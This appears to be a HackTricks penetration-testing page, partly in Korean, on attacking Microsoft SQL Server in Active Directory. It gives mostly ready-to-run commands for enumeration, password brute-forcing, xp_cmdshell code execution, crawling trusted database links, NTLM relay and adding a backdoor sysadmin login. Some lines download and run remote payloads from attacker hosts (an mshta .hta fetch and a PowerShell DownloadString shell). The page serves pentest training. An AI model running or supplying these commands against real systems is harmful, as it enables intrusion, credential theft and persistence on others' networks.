# MSSQL AD Abuse

{{#include ../../banners/hacktricks-training.md}}


## **MSSQL Enumeration / Discovery**

### Python

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) tool은 impacket를 기반으로 하며, kerberos tickets를 사용한 인증과 link chains를 통한 공격도 지원합니다.

<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
```shell
# Interactive mode
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

# Interactive mode with 2 depth level of impersonations

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -max-impersonation-depth 2 interactive

# Executing custom assembly on the current server with windows authentication and executing hostname command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate

# Issuing NTLM relay attack on the SRV01 server

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# Executing direct query

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"

# Retrieving password from the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password

# Execute code using custom assembly on the linked server DC01

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll

# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt

mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt

```
### 도메인 세션 없이 네트워크에서 열거하기
```

# Interactive mode

mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive

````
---
###  Powershell

powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)은 이 경우 매우 유용합니다.
```bash
Import-Module .\PowerupSQL.psd1
````
### 도메인 세션 없이 네트워크에서 열거하기
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```
### 도메인 내부에서 열거하기
```bash
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose

# Try dictionary attack to login
Invoke-SQLAuditWeakLoginPw

# Search SPNs of common software and try the default creds
Get-SQLServerDefaultLoginPw

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
## MSSQL 기본 악용

### DB 접근
```bash
# List databases
Get-SQLInstanceDomain | Get-SQLDatabase

# List tables in a DB you can read
Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName

# List columns in a table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName

# Get some sample data from a column in a table (columns username & passwor din the example)
Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10

#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lot of CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
```
### MSSQL RCE

MSSQL host 내부에서 **명령을 실행**할 수도 있습니다
```bash
Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
**다음 섹션에서 이를 수동으로 수행하는 방법을 확인하세요.**

### MSSQL Basic Hacking Tricks


{{#ref}}
../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
{{#endref}}

## MSSQL Trusted Links

MSSQL instance가 다른 MSSQL instance에 의해 trusted(database link)된 경우, 사용자가 trusted database에 대한 권한을 가지고 있다면 **trust relationship을 사용하여 다른 instance에서도 쿼리를 실행**할 수 있습니다. 이러한 trust는 연쇄적으로 연결될 수 있으며, 어느 시점에 사용자는 명령을 실행할 수 있도록 잘못 구성된 database를 발견할 수 있습니다.

**database 간 link는 forest trust를 통해서도 작동합니다.**

### Powershell Abuse
```bash
#Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

#Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

#If you are sysadmin in some trusted link you can enable xp_cmdshell with:
Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'

#Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"

#Obtain a shell
Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'

#Check for possible vulnerabilities on an instance where you have access
Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"

#Try to escalate privileges on an instance
Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"

#Manual trusted link queery
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
## Enable xp_cmdshell and check it
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [sql.rto.external]'
Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [sql.rto.external]'
## If you see the results of @@selectname, it worked
Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
```
사용할 수 있는 또 다른 유사한 도구는 [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn)입니다:
```bash
SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
# Cobalt Strike
inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
```
### Metasploit

metasploit을 사용하면 trusted links를 쉽게 확인할 수 있습니다.
```bash
#Set username, password, windows auth (if using AD), IP...
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```
metasploit은 MSSQL에서 `openquery()` 함수만 악용하려고 시도한다는 점에 유의하세요(따라서 `openquery()`로 명령을 실행할 수 없는 경우 아래에서 자세히 설명하는 `EXECUTE` method를 **수동으로** 시도하여 명령을 실행해야 합니다.)

### Manual - Openquery()

**Linux**에서는 **sqsh**와 **mssqlclient.py**를 사용하여 MSSQL console shell을 얻을 수 있습니다.

**Windows**에서는 링크를 확인하고 [**HeidiSQL**](https://www.heidisql.com)과 같은 **MSSQL client**를 사용하여 수동으로 명령을 실행할 수도 있습니다.

_Windows authentication을 사용하여 로그인:_

![Metasploit - Manual - Openquery(): Windows authentication을 사용하여 로그인](<../../images/image (808).png>)

#### Trustable Links 찾기
```sql
select * from master..sysservers;
EXEC sp_linkedservers;
```
![Manual - Openquery() - 신뢰할 수 있는 링크 찾기: EXEC sp linkedservers;](<../../images/image (716).png>)

#### 신뢰할 수 있는 링크에서 쿼리 실행

링크를 통해 쿼리를 실행합니다(예: 새로 액세스할 수 있는 instance에서 더 많은 링크 찾기):
```sql
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
```
> [!WARNING]
> 큰따옴표와 작은따옴표가 사용된 위치를 확인하세요. 해당 방식으로 사용하는 것이 중요합니다.

![신뢰할 수 있는 링크 찾기 - 신뢰할 수 있는 링크에서 쿼리 실행: 큰따옴표와 작은따옴표가 사용된 위치를 확인하세요. 해당 방식으로 사용하는 것이 중요합니다.](<../../images/image (643).png>)

이러한 신뢰할 수 있는 링크 체인을 수동으로 영원히 계속 이어갈 수 있습니다.
```sql
# First level RCE
SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')

# Second level RCE
SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
```
`openquery()`에서 `exec xp_cmdshell`과 같은 작업을 수행할 수 없다면 `EXECUTE` method를 사용해 보세요.

### Manual - EXECUTE

`EXECUTE`를 사용하여 trusted links를 악용할 수도 있습니다:
```bash
#Create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```
## Local Privilege Escalation

**MSSQL local user**는 일반적으로 **`SeImpersonatePrivilege`**라는 특수한 유형의 권한을 보유합니다. 이 권한을 사용하면 계정이 "인증 후 클라이언트를 impersonate"할 수 있습니다.

많은 저자가 고안한 전략 중 하나는 공격자가 생성한 rogue 또는 man-in-the-middle service에 SYSTEM service가 인증하도록 강제하는 것입니다. 그런 다음 이 rogue service는 SYSTEM service가 인증을 시도하는 동안 해당 SYSTEM service를 impersonate할 수 있습니다.

[SweetPotato](https://github.com/CCob/SweetPotato)에는 이러한 다양한 기법이 포함되어 있으며, Beacon의 `execute-assembly` 명령을 통해 실행할 수 있습니다.



### SCCM Management Point NTLM Relay (OSD Secret Extraction)
SCCM **Management Points**의 기본 SQL roles를 악용하여 site database에서 Network Access Account 및 Task-Sequence secrets를 직접 dump하는 방법은 다음을 참조하세요:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
